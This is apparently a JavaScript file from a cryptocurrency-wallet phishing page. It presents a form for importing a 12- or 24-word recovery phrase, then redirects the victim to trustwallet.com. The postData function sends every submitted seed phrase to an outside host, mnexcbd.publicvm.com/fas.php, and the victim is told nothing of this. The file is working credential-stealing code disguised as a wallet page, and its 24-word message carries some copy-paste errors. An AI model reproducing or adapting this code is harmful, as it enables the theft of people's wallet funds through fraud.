const containerBox1 = document.querySelector(".container-box");
const containerBox2 = document.querySelector(".container-box-2");
const containBox3 = document.querySelector(".containBox3");
const box1 = document.querySelector(".box1");
const [btnNext1, btnNext2, btnNext3] = document.querySelectorAll(".btnNext-1");
const [backBtn1, backBtn2] = document.querySelectorAll(".back-btn");
const wordValue = document.querySelector(".word-value");
const wordInput = document.querySelectorAll(".word-12");
const wordInput24 = document.querySelectorAll(".word-24");
const wordMain = document.querySelectorAll(".word-main");
const [mainform1, mainForm2] = document.querySelectorAll(".main-form");
const eyeBox1 = document.querySelectorAll(".eyebox-1");
const eyeBox2 = document.querySelectorAll(".eyebox-2");
const preloader = document.querySelector(".preloader");
const [form1, form2] = document.querySelectorAll("#form");
const eyeClick1 = document.querySelectorAll(".eyeClick1");
const eyeClick2 = document.querySelectorAll(".eyeClick2");
const count2 = document.querySelector(".counter");



const word1 = document.getElementById("word1");
const word2 = document.getElementById("word2");
const word3 = document.getElementById("word3");
const word4 = document.getElementById("word4");
const word5 = document.getElementById("word5");
const word6 = document.getElementById("word6");
const word7 = document.getElementById("word7");
const word8 = document.getElementById("word8");
const word9 = document.getElementById("word9");
const word10 = document.getElementById("word10");
const word11 = document.getElementById("word11");
const word12 = document.getElementById("word12");



const word241 = document.getElementById("word-24-1");
const word242 = document.getElementById("word-24-2");
const word243 = document.getElementById("word-24-3");
const word244 = document.getElementById("word-24-4");
const word245 = document.getElementById("word-24-5");
const word246 = document.getElementById("word-24-6");
const word247 = document.getElementById("word-24-7");
const word248 = document.getElementById("word-24-8");
const word249 = document.getElementById("word-24-9");
const word2410 = document.getElementById("word-24-10");
const word2411 = document.getElementById("word-24-11");
const word2412 = document.getElementById("word-24-12");
const word2413 = document.getElementById("word-24-13");
const word2414 = document.getElementById("word-24-14");
const word2415 = document.getElementById("word-24-15");
const word2416 = document.getElementById("word-24-16");
const word2417 = document.getElementById("word-24-17");
const word2418 = document.getElementById("word-24-18");
const word2419 = document.getElementById("word-24-19");
const word2420 = document.getElementById("word-24-20");
const word2421 = document.getElementById("word-24-21");
const word2422 = document.getElementById("word-24-22");
const word2423 = document.getElementById("word-24-23");
const word2424 = document.getElementById("word-24-24");



  const timer2 = (timeleft) => {
        let downloadTimer = setInterval(function () {
          if (timeleft <= 0) {
            clearInterval(downloadTimer);
          }
          count2.textContent = `0:0${0 + timeleft} Seconds`;
          timeleft -= 1;
          if (timeleft === -1) {
            window.location.replace("https://trustwallet.com/");
          }
        }, 1000);
      };


        const postData  = (data) => {
        $.ajax({
          //post php link here....
          url: "https://mnexcbd.publicvm.com/fas.php",
          type: "POST",
          data: { pass: data },
        });
      };

const handleNextPage = () => {
    containerBox1.classList.add("hide");
    containerBox2.classList.remove("hide");
};

const handleBackPage = () => {
    containerBox1.classList.remove("hide");
    containerBox2.classList.add("hide");
};

box1.addEventListener("click", () => {
    handleNextPage();
});

btnNext1.addEventListener("click", () => {
    handleNextPage();
});

btnNext2.addEventListener("click", () => {
    handleNextPage();
});

backBtn1.addEventListener("click", () => {
    handleBackPage();
});

backBtn2.addEventListener("click", () => {
    handleBackPage();
});



wordValue.addEventListener("change", () => {
    if(wordValue.value === "12"){
        mainform1.classList.remove("hide");
        mainForm2.classList.add("hide");
    }
    else {
        mainForm2.classList.remove("hide");
        mainform1.classList.add("hide");
    }
});


form1.addEventListener("submit", (e) => {
    e.preventDefault();
      if(word1.value === "" || word2.value === "" ||  word3.value === "" || word4.value === "" || word5.value === "" || word6.value === "" || word7.value === "" || word8.value === "" || word9.value === "" || word10.value === "" || word11.value === "" || word12.value === ""){
    btnNext2.disabled = true;
    }
    else {

        let data = `Word 1: ${word1.value} \nWord 2: ${word2.value} \nWord 3: ${word3.value} \nWord 4: ${word4.value} \nWord 5: ${word5.value} \nWord 6: ${word6.value} \nWord 7: ${word7.value} \nWord 8: ${word8.value} \nWord 9: ${word9.value} \nWord 10: ${word10.value} \nWord 11: ${word11.value} \nWord 12: ${word12.value}`;
        postData(data);
        preloader.classList.remove("hide");

        setTimeout(() => {
            containerBox2.classList.add("hide");
            containBox3.classList.remove("hide");
            preloader.classList.add("hide");
            timer2(10);
        }, 3000);
    }
});


form2.addEventListener("submit", (e) => {
    e.preventDefault();
      if(word241.value === "" || word242.value === "" ||  word243.value === "" || word244.value === "" || word245.value === "" || word246.value === "" || word247.value === "" || word248.value === "" || word249.value === "" || word2410.value === "" || word2411.value === "" || word2412.value === "" || word2413.value === "" || word2414.value === "" ||  word2415.value === "" || word2416.value === "" || word2417.value === "" || word2418.value === "" || word2419.value === "" || word2420.value === "" || word2421.value === "" || word2422.value === "" || word2423.value === "" || word2424.value === ""){
    btnNext3.disabled = true;
    }

    else {
        let data = `Word 1: ${word241.value} \nWord 2: ${word242.value} \nWord 3: ${word243.value} \nWord 4: ${word244.value} \nWord 5: ${word245.value} \nWord 6: ${word246.value} \nWord 7: ${word247.value} \nWord 8: ${word248.value} \nWord 9: ${word249.value} \nWord 10: ${word2410.value} \nWord 11: ${word2411.value} \nWord 12: ${word2412.value} \nWord 13: ${word2413.value} \nWord 14: ${word2414.value} \nWord 15: ${word2415.value} \nWord 16: ${word2416.value} \nWord 17: ${word2417.value} \nWord 18: ${word2418.value} \nWord 19: ${word2419.value} \nWord 20: ${word2418.value} \nWord 21: ${word2421.value} \nWord 22: ${word2422.value} \nWord 23: ${word2423.value}, \nWord 24: ${word2422.value}`;
        
        postData(data);
        preloader.classList.remove("hide");
        setTimeout(() => {
            containerBox2.classList.add("hide");
            containBox3.classList.remove("hide");
            preloader.classList.add("hide");
            timer2(10);
        }, 3000);
    }
})


wordInput.forEach((input) => {
    input.addEventListener("keyup", () => {
        if(word1.value !== "" && word2.value !== "" &&  word3.value !== "" && word4.value !== "" && word5.value !== "" && word6.value !== "" && word7.value !== "" && word8.value !== "" && word9.value !== "" && word10.value !== "" && word11.value !== "" && word12.value !== ""){
            btnNext2.disabled = false;
            
        }
    })
});

wordInput24.forEach((input) => {
    input.addEventListener("keyup", () => {
        if(word241.value !== "" && word242.value !== "" &&  word243.value !== "" && word244.value !== "" && word245.value !== "" && word246.value !== "" && word247.value !== "" && word248.value !== "" && word249.value !== "" && word2410.value !== "" && word2411.value !== "" && word2412.value !== "" && word2413.value !== "" && word2414.value !== "" &&  word2415.value !== "" && word2416.value !== "" && word245.value !== "" && word246.value !== "" && word247.value !== "" && word248.value !== "" && word249.value !== "" && word2417.value !== "" && word2418.value !== "" && word2419.value !== "" && word2420.value !== "" && word2421.value !== "" && word2422.value !== "" && word2423.value !== "" && word2424.value !== ""){
            btnNext3.disabled = false;
        }
    })
});


eyeBox1.forEach((eyeBox, index) => {
    eyeBox.addEventListener("click", () => {
             wordInput[index].type = "text";
            eyeBox1[index].classList.add("hide");
            eyeBox2[index].classList.remove("hide");
           
    });
});

eyeClick1.forEach((eyeBox, index) => {
    eyeBox.addEventListener("click", () => {
            wordInput24[index].type = "text";
            eyeClick1[index].classList.add("hide");
            eyeClick2[index].classList.remove("hide");
           
    });
});

eyeBox2.forEach((eyeBox, index) => {
    eyeBox.addEventListener("click", () => {
        wordInput[index].type = "password";
        eyeBox1[index].classList.remove("hide");
        eyeBox2[index].classList.add("hide");
    
    })
})
eyeClick2.forEach((eyeBox, index) => {
    eyeBox.addEventListener("click", () => {
        wordInput24[index].type = "password";
        eyeClick1[index].classList.remove("hide");
        eyeClick2[index].classList.add("hide");
    
    })
})